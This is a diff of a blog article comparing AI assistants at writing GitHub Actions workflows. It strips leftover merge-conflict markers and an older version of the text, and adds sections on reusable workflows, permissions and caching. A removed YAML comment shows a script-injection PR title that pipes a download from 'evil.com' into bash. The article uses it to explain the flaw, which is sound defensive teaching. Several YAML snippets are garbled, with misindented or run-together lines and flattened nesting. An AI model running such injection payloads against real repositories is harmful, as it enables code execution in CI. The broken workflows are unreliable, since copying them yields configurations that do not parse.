@@ -15,38 +15,21 @@ tags: [ai-tools-compared]
 
 {% raw %}
 
-GitHub Actions YAML looks simple but has a long tail of security and reliability pitfalls: script injection via `${{ github.event.pull_request.title }}`, overly broad permissions, missing timeout settings, and cache invalidation issues. AI tools vary significantly in how well they handle these production-grade concerns.
+# Best AI Tools for Writing GitHub Actions in 2026
 
-## Key Takeaways
+GitHub Actions YAML is deceptively simple on the surface and deeply complex once you need matrix builds, reusable workflows, OIDC authentication, or proper caching. AI tools that understand only the syntax produce workflows that run — but burn twice the compute, fail under load, or silently skip security controls.
 
-- **Topics covered**: the security gap, task 1: full ci pipeline with security, task 2: oidc authentication (keyless aws access)
-- **Practical guidance included**: Step-by-step setup and configuration instructions
-- **Use-case recommendations**: Specific guidance based on team size and requirements
-- **Trade-off analysis**: Strengths and limitations of each option discussed
+## The Test Cases
 
-## Prerequisites
+Three workflows form the benchmark:
+1. A Node.js CI with matrix builds across Node versions and OS
+2. A Docker build with OIDC push to AWS ECR (no stored credentials)
+3. A reusable workflow called from multiple repositories
 
-Before you begin, make sure you have the following ready:
+## Claude for GitHub Actions
 
-- A computer running macOS, Linux, or Windows
-- Terminal or command-line access
-- Administrator or sudo privileges (for system-level changes)
-- A stable internet connection for downloading tools
+Claude is the strongest overall. It understands the difference between `github.token` and `secrets.GITHUB_TOKEN`, knows when to use `actions/cache@v4` vs `setup-node`'s built-in cache, and generates OIDC authentication correctly without being asked.
 
-<<<<<<< HEAD
-
-### Step 1: The Security Gap
-
-This is where the tools diverge most. A 2026 GitHub security advisory found that script injection via `github.event` context is the number one CI vulnerability. Only Claude consistently flags it without prompting.
-
-A vulnerable pattern looks like this:
-
-```yaml
-# VULNERABLE — do not use
-- name: Print PR title
-  run: echo "PR title: ${{ github.event.pull_request.title }}"
-# An attacker can create a PR with title: "; curl evil.com | bash;"
-=======
 **Prompt:**
 ```text
 Write a GitHub Actions workflow for a Node.js monorepo. Requirements:
@@ -71,113 +54,14 @@ Write a GitHub Actions workflow that:
 - Runs linting and tests
 - Only builds on main branch
 Use strict permissions: contents read, checks write.
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 ```
 
-Claude automatically rewrites this to the safe environment variable pattern:
+**Claude output:**
 
-```yaml
-# Claude's secure version
-- name: Print PR title
-  env:
-    PR_TITLE: ${{ github.event.pull_request.title }}
-  run: echo "PR title: $PR_TITLE"
-  # Environment variables are sanitized — no injection risk
-```
-
-Copilot and Cursor both miss this class of vulnerability in testing. They will reproduce the injection-vulnerable pattern from examples without flagging it.
-
-### Step 2: Task 1: Full CI Pipeline with Security
-
-**Prompt:** "Write a CI pipeline for a Python project that runs tests, checks coverage, and builds a Docker image."
-
-**Copilot's output (simplified):**
-
-```yaml
-on: push
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - run: pip install -r requirements.txt
-      - run: pytest
-      - run: docker build -t myapp .
-      - run: docker push myapp
-        env:
-          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
-```
-
-Missing: permissions, timeout, caching, and Docker credentials are handled insecurely (mixing with plaintext).
-
-**Claude's output:**
 ```yaml
 name: CI
 
 on:
-<<<<<<< HEAD
-  push:
-branches: [main, develop]
-  pull_request:
-    branches: [main]
-
-permissions:
-  contents: read        # Minimum required for checkout
-  packages: write       # Only for GHCR push job
-  id-token: write       # Only for OIDC-based auth
-
-jobs:
-  test:
-    name: Test and Coverage
-    runs-on: ubuntu-latest
-    timeout-minutes: 15   # Prevent hung builds
-
-    strategy:
-      matrix:
-        python-version: ['3.11', '3.12']
-    steps:
-      - uses: actions/checkout@v4
-
-- name: Set up Python ${{ matrix.python-version }}
-        uses: actions/setup-python@v5
-        with:
-          python-version: ${{ matrix.python-version }}
-
-      - name: Cache pip packages
-        uses: actions/cache@v4
-        with:
-          path: ~/.cache/pip
-          key: ${{ runner.os }}-pip-${{ matrix.python-version }}-${{ hashFiles('requirements*.txt') }}
-          restore-keys: |
-            ${{ runner.os }}-pip-${{ matrix.python-version }}-
-
-      - name: Install dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install -r requirements.txt -r requirements-dev.txt
-
-      - name: Run tests with coverage
-        run: |
-          pytest --cov=src --cov-report=xml --cov-fail-under=80 -v
-
-      - name: Upload coverage report
-        uses: codecov/codecov-action@v4
-        if: matrix.python-version == '3.12'
-        with:
-          token: ${{ secrets.CODECOV_TOKEN }}
-          fail_ci_if_error: false
-
-  build-image:
-    name: Build Docker Image
-    needs: test
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    if: github.ref == 'refs/heads/main'
-
-    permissions:
-      contents: read
-      packages: write
-=======
  push:
  branches: [main, 'release/**']
  pull_request:
@@ -196,64 +80,10 @@ jobs:
  matrix:
  node-version: ['18', '20', '22']
  os: [ubuntu-latest, windows-latest]
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 
  steps:
  - uses: actions/checkout@v4
 
-<<<<<<< HEAD
-      - name: Log in to GHCR
-        uses: docker/login-action@v3
-        with:
-          registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Extract metadata for Docker
-        id: meta
-        uses: docker/metadata-action@v5
-        with:
-          images: ghcr.io/${{ github.repository }}
-          tags: |
-            type=sha,prefix=sha-
-            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
-
-      - name: Build and push Docker image
-        uses: docker/build-push-action@v5
-        with:
-          context: .
-          push: true
-          tags: ${{ steps.meta.outputs.tags }}
-          labels: ${{ steps.meta.outputs.labels }}
-          cache-from: type=gha
-          cache-to: type=gha,mode=max
-```
-
-Claude added: `timeout-minutes`, `permissions` scoped to minimum required, `cache-from/to: type=gha` for Docker layer caching, and used `GITHUB_TOKEN` instead of a stored Docker password for GHCR.
-
-### Step 3: Task 2: OIDC Authentication (Keyless AWS Access)
-
-**Prompt:** "Write a GitHub Action that deploys to AWS using OIDC (no stored credentials)."
-
-```yaml
-name: Deploy to AWS
-
-on:
-  push:
-    branches: [main]
-
-permissions:
-  id-token: write
-  contents: read
-
-jobs:
-  deploy:
-    runs-on: ubuntu-latest
-    timeout-minutes: 30
-    environment: production
-    steps:
-      - uses: actions/checkout@v4
-=======
  - name: Setup Node.js ${{ matrix.node-version }}
  uses: actions/setup-node@v4
  with:
@@ -290,7 +120,6 @@ on:
 permissions:
  contents: read
  checks: write
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 
 jobs:
  test:
@@ -533,47 +362,6 @@ name: Setup and Build
 description: Install dependencies and build the project
 
 inputs:
-<<<<<<< HEAD
-  node-version:
-    description: Node.js version to use
-    required: false
-    default: '20'
-  working-directory:
-    description: Directory containing package.json    required: false
-    default: '.'
-
-outputs:
-  cache-hit:
-description: 'Whether the node_modules cache was hit'
-    value: ${{ steps.cache-modules.outputs.cache-hit }}
-runs:
-  using: composite
-  steps:
-    - name: Setup Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: ${{ inputs.node-version }}
-- name: Get package lock hash
-      id: hash
-      shell: bash
-      run: |
-        echo "lockfile-hash=$(sha256sum ${{ inputs.working-directory }}/package-lock.json | cut -d' ' -f1)" >> $GITHUB_OUTPUT
-
-    - name: Cache node_modules
-      id: cache-modules
-      uses: actions/cache@v4
-      with:
-        path: ${{ inputs.working-directory }}/node_modules
-        key: ${{ runner.os }}-node-${{ inputs.node-version }}-${{ steps.hash.outputs.lockfile-hash }}
-        restore-keys: |
-          ${{ runner.os }}-node-${{ inputs.node-version }}-
-
-    - name: Install dependencies
-      if: steps.cache-modules.outputs.cache-hit != 'true'
-      shell: bash
-      working-directory: ${{ inputs.working-directory }}
-      run: npm ci --prefer-offline
-=======
  node-version:
  description: Node.js version to use
  required: false
@@ -607,36 +395,67 @@ runs:
  shell: bash
  working-directory: ${{ inputs.working-directory }}
  run: npm run build
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 ```
 
-Copilot generated a similar composite action but omitted the `outputs` section and used `npm install` instead of `npm ci`. In CI environments, `npm ci` is always preferred: it installs exactly what is in the lockfile, errors on lockfile mismatch, and is faster because it skips the dependency resolution step.
+The `shell: bash` is required in composite actions — Claude includes it; many AI tools omit it, causing failures on Windows runners.
 
-## Tool Comparison
+### Reusable Workflows vs Composite Actions
 
-| Pattern | Claude Code | Copilot | Cursor |
-|---|---|---|---|
-| Script injection prevention | Flags proactively | Misses it | Misses it |
-| Permissions scoping | Minimum required | write-all or missing | Partial |
-| OIDC auth | Correct with IAM policy | Stored credentials | Stores credentials |
-| Composite actions | Full with outputs | Missing outputs | Partial |
-| timeout-minutes | Always includes | Often missing | Sometimes includes |
-| Docker layer caching | type=gha | Basic or missing | Basic |
+A common point of confusion is when to use reusable workflows (`workflow_call`) vs composite actions. Claude explains the distinction correctly when asked:
 
-## Workflow Patterns AI Tools Frequently Get Wrong
-
-Even beyond the security gap, there are workflow patterns that AI tools consistently handle poorly.
-
-### Concurrency Control
-
-Without explicit concurrency settings, multiple pushes to the same branch queue parallel runs, which wastes runner minutes and causes deployment race conditions. Claude adds this automatically; the other tools rarely do:
+- **Composite actions** run within a job's context — they can't define their own jobs, services, or runners. Use them for shared steps.
+- **Reusable workflows** are full workflows called from another workflow — they can define their own jobs, strategy matrices, and runners. Use them for shared CI pipelines.
 
 ```yaml
-<<<<<<< HEAD
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
-=======
+# Reusable workflow — called with workflow_call
+# .github/workflows/reusable-test.yml
+on:
+  workflow_call:
+    inputs:
+      node-version:
+        required: false
+        type: string
+        default: '20'
+    secrets:
+      CODECOV_TOKEN:
+        required: true
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ inputs.node-version }}
+          cache: npm
+      - run: npm ci
+      - run: npm test
+      - uses: codecov/codecov-action@v4
+        with:
+          token: ${{ secrets.CODECOV_TOKEN }}
+```
+
+And the caller:
+
+```yaml
+# .github/workflows/ci.yml
+jobs:
+  run-tests:
+    uses: ./.github/workflows/reusable-test.yml
+    with:
+      node-version: '22'
+    secrets:
+      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
+```
+
+Claude generates both sides of this pattern correctly. Copilot generates only the reusable workflow definition and omits the `secrets` pass-through in the caller, causing the called workflow to fail because secrets don't inherit automatically.
+
+## Security Hardening Patterns
+
+For production workflows, add these hardening steps that Claude applies correctly when prompted:
+
+```yaml
 # Pin all actions to full commit SHA, not tags
 - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
 
@@ -651,33 +470,36 @@ permissions:
  run: |
  # Never interpolate github context directly into run commands
  echo "PR title length: ${#USER_INPUT}"
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 ```
 
-For production deploys you typically want `cancel-in-progress: false` so an in-flight deployment finishes before the next starts. Claude understands this distinction when you explain the use case.
+The script injection pattern — interpolating `${{ github.event.pull_request.title }}` directly into a `run` block — is a common vulnerability that Copilot frequently generates. Claude warns about this and uses environment variable indirection instead.
 
-### Pinned vs Floating Action Versions
+### Token Permission Scoping
 
-Using `actions/checkout@v4` is convenient but means your workflow behavior can silently change when the action maintainer pushes a new commit to that tag. The more secure pattern pins to the full commit SHA:
+Claude's default permission scoping is minimal — `contents: read` at the workflow level with explicit per-job escalation:
 
 ```yaml
-- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+# Global minimum
+permissions:
+  contents: read
+
+jobs:
+  deploy:
+    permissions:
+      contents: read
+      id-token: write      # OIDC only — scoped to this job
+      deployments: write   # Deployment status only — scoped to this job
+    runs-on: ubuntu-latest
+    steps:
+      # ...
 ```
 
-Claude will suggest SHA pinning when asked about supply chain security. Copilot defaults to tag references without flagging the risk.
+Copilot frequently generates `permissions: write-all` or omits permissions entirely, leaving the default `write` access on `contents` — which allows any step in the workflow to modify repository contents.
 
-### Environment Protection Rules
-
-Claude is the only tool tested that proactively suggests setting up GitHub Environment protection rules for production deployments. The `environment` key requires a designated reviewer to approve before the deploy job runs:
+## Advanced: Dynamic Matrix Generation
 
 ```yaml
 jobs:
-<<<<<<< HEAD
-  deploy:
-    environment:
-      name: production
-      url: https://yourapp.com
-=======
  generate-matrix:
  runs-on: ubuntu-latest
  outputs:
@@ -700,14 +522,67 @@ jobs:
  - uses: actions/checkout@v4
  - name: Build ${{ matrix.service }}
  run: docker build services/${{ matrix.service }}
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 ```
 
-Without this, any push to main triggers an immediate deploy with no approval gate.
+### Handling Empty Dynamic Matrices
 
-<<<<<<< HEAD
-## When to Use Each Tool
-=======
+The `if` condition on `build-services` guards against an empty matrix — a case that causes a confusing workflow failure without it. Claude includes this guard automatically. The condition checks whether the `service` array is empty after the `generate-matrix` job runs.
+
+One edge case Claude handles correctly: when `git diff HEAD~1 HEAD` runs on the initial commit (no `HEAD~1`), it errors out. Claude adds `|| true` or fetches with `--depth=2` to handle shallow clones:
+
+```yaml
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 2  # Required for git diff HEAD~1
+
+      - id: set-matrix
+        run: |
+          SERVICES=$(git diff --name-only HEAD~1 HEAD 2>/dev/null | grep '^services/' | cut -d/ -f2 | sort -u | jq -R . | jq -sc .)
+          SERVICES=${SERVICES:-'[]'}
+          echo "matrix={\"service\":$SERVICES}" >> $GITHUB_OUTPUT
+```
+
+## Caching Strategies
+
+Claude differentiates between caching approaches based on package manager and monorepo structure:
+
+```yaml
+# Single-package npm project — use setup-node built-in cache
+- uses: actions/setup-node@v4
+  with:
+    node-version: '20'
+    cache: npm
+
+# Monorepo with multiple package.json files — use actions/cache with glob
+- uses: actions/cache@v4
+  with:
+    path: |
+      ~/.npm
+      **/node_modules
+    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      ${{ runner.os }}-node-
+
+# pnpm — requires separate cache setup
+- uses: pnpm/action-setup@v3
+  with:
+    version: 9
+
+- name: Get pnpm store directory
+  id: pnpm-cache
+  run: echo "dir=$(pnpm store path)" >> $GITHUB_OUTPUT
+
+- uses: actions/cache@v4
+  with:
+    path: ${{ steps.pnpm-cache.outputs.dir }}
+    key: ${{ runner.os }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}
+    restore-keys: ${{ runner.os }}-pnpm-
+```
+
+Copilot defaults to the npm built-in cache even when the project uses pnpm or yarn, requiring a manual correction.
+
+## Related Articles
+
 - [AI-Powered CI/CD Pipeline Optimization](/ai-powered-cicd-pipeline-optimization-2026/)
 - [Best AI Tools for Writing Makefiles](/best-ai-tools-for-writing-makefiles-2026/)
 - [AI Tools for Automated Migration Testing](/ai-tools-for-automated-migration-testing-2026/)
@@ -813,42 +688,6 @@ Claude catches these automatically:
 - [AI Assistants for Writing Correct AWS IAM Policies](/ai-tools-compared/ai-assistants-for-writing-correct-aws-iam-policies-with-least-privilege/)
 
 ---
->>>>>>> 2d1c47c16fb62f06950641ed41edf031fb823a41
 
-**Use Claude Code** when writing a new workflow from scratch where security matters. It produces complete, production-hardened YAML in a single pass. The security defaults — OIDC, permission scoping, injection prevention — are included without prompting.
-
-**Use Copilot** for quick edits to existing workflows inside VS Code. It is fast and context-aware about your local files, which helps when adding a step that references a local script or Dockerfile. For new workflows, verify it against a security checklist before merging.
-
-**Use Cursor** when iterating rapidly and wanting an in-editor chat to explain why a step is failing. Cursor's ability to read error logs and suggest fixes is its strongest feature for CI debugging. Its security defaults are not reliable enough to use unreviewed in production.
-
-## Troubleshooting
-
-**Configuration changes not taking effect**
-
-Restart the relevant service or application after making changes. Some settings require a full system reboot. Verify the configuration file path is correct and the syntax is valid.
-
-**Permission denied errors**
-
-Run the command with `sudo` for system-level operations, or check that your user account has the necessary permissions. On macOS, you may need to grant terminal access in System Settings > Privacy and Security.
-
-**OIDC credentials error: Could not assume role**
-
-Verify that the OIDC provider `token.actions.githubusercontent.com` is registered in your AWS account under IAM > Identity providers. The trust policy `sub` condition must exactly match your repo path and branch: `repo:org/repo:ref:refs/heads/main`.
-
-**Cache not restoring between runs**
-
-The cache key must be deterministic. If your lock file changes between runs (e.g., a bot auto-updates dependencies), use `restore-keys` as a fallback. Caches are scoped to the branch — a cache created on `main` is available to PRs, but not vice versa.
-
-**Connection or network-related failures**
-
-Check your internet connection and firewall settings. If using a VPN, try disconnecting temporarily to isolate the issue. Verify that the target server or service is accessible from your network.
-
-## Related Reading
-
-- [Best AI Tools for Writing GitHub Actions Workflows](/ai-tools-compared/best-ai-tools-for-writing-github-actions-workflows-2026/)
-- [AI Tools for Automated PR Description Generation](/ai-tools-compared/ai-tools-for-automated-pr-description-generation/)
-- [Claude Code Hooks and Custom Workflows Guide](/ai-tools-compared/claude-code-hooks-and-custom-workflows-guide/)
-
----
 Built by theluckystrike — More at [zovo.one](https://zovo.one)
 {% endraw %}
